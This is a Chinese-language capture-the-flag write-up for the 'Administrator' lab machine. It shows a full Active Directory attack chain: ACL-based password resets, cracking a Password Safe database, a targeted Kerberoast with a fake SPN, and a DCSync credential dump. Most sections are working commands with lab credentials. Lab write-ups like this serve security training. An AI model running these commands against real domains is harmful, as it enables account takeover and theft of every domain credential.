---
title: Administrator
description: 
tags:
  - ACL Abuse Chain
  - Targeted Kerberoast
date: 2026-06-11
---

## 攻擊路徑

```
Olivia ──GenericAll──▶ Michael ──ForceChangePassword──▶ Benjamin ──ftp──(psafe3)──▶ Emily ──Targeted Kerberoast──▶ ...
```

## Initial Access

外面掃了一圈發現基本上都不能登入，於是只好直接 bloodhound 來看看：

```bash
bloodhound-python -u 'Olivia' -p 'ichliebedich' -d 'administrator.htb' -ns '10.129.167.206' -c All --zip
```

發現：

```
Olivia ──GenericAll──▶ Michael ──ForceChangePassword──▶ Benjamin
```

## GenericAll 濫用

由於有 GenericAll 的權限，所以可以直接重設 Michael 的密碼：

```bash
# 方法一：net rpc
net rpc password "michael" "NewPass123!" -U "ADMINISTRATOR.HTB"/"olivia"%"olivia的密碼" -S <DC_IP>

# 方法二：rpcclient
rpcclient -U "michael%NewPass123!" <DC_IP>
> setuserinfo2 benjamin 23 'NewPass456!'
```

其中，setuserinfo2 的 23 是 Windows API USER_INFO 的 information level，level 23 代表設定使用者密碼。

## ForceChangePassword 濫用

同樣的，利用 Michael 的身份改 Benjamin 的密碼：

```bash
net rpc password "benjamin" "NewPass456!" -U "ADMINISTRATOR.HTB"/"michael"%"NewPass123!" -S <DC_IP>
```

## 取得 Backup.psafe3

nxc 掃一下發現 Benjamin 的 ftp 有開放，裡面有個 Backup.psafe3 的檔案，這是一個 Password Safe V3 的資料庫檔案，直接載下來。這個檔案有上一個 master password，需要先進行破解：

```bash
# 方法一：pwsafe2john + john
# 先用 pwsafe2john 提取 hash
pwsafe2john Backup.psafe3 > hash.txt
# 再用 john 爆破
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 方法二：hashcat
hashcat -m 5200 hash.txt /usr/share/wordlists/rockyou.txt
```

接著需要使用工具 pwsafe 來開啟（也可以使用 keepass2），就可以快樂的拿到使用者密碼了：

```bash
sudo apt install passwordsafe
pwsafe Backup.psafe3
```

## Targeted Kerberoast

本集精髓，方法：
1. 幫目標加上 SPN（用 GenericAll/GenericWrite 權限）
2. 對該 SPN 做 Kerberoast
3. 離線破解 TGS ticket
4. 移除 SPN（可選，因為不會被發現）

以下提供一般作法及自動化作法：

```bash
# 方法一：一般作法
## 設定假 SPN
bloodyAD -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -d administrator.htb --host 10.129.167.146 set object ethan servicePrincipalName -v 'HTTP/fake'
## 列舉 SPN 並請求 TGS ticket
impacket-GetUserSPNs -dc-ip 10.129.167.146 'administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -request -outputfile kerberoast.txt
## 離線破解 TGS
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
## 移除假 SPN
bloodyAD -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -d administrator.htb --host 10.129.167.146 set object ethan servicePrincipalName


# 方法二：自動化作法
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
uv add --script targetedKerberoast.py -r requirements.txt
uv run targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
## 離線破解 TGS
hashcat ethan.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

其中，`HTTP/fake.administrator.htb` 是我們設定的假 SPN，格式須為 `<service>/<hostname>`，HTTP/ 只是一個服務類型前綴，常見的有：

- HTTP/ — Web 服務
- MSSQLSvc/ — SQL Server
- CIFS/ — 檔案共享
- HOST/ — 通用主機服務

另外，也要記得時間同步：

```bash
# 先關掉自動時間同步
sudo timedatectl set-ntp off

# 再同步一次
sudo ntpdate administrator.htb
# 執行腳本 ...

# 做完後記得開啟自動時間同步
sudo timedatectl set-ntp on
```

## DCSync Attack

發現 emily 對 DC 有 DCSync 的權限，直接發動 DCSync Attack 就可以拿到所有帳號的 hash。

```bash
impacket-secretsdump administrator.htb/emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb@10.129.167.146
```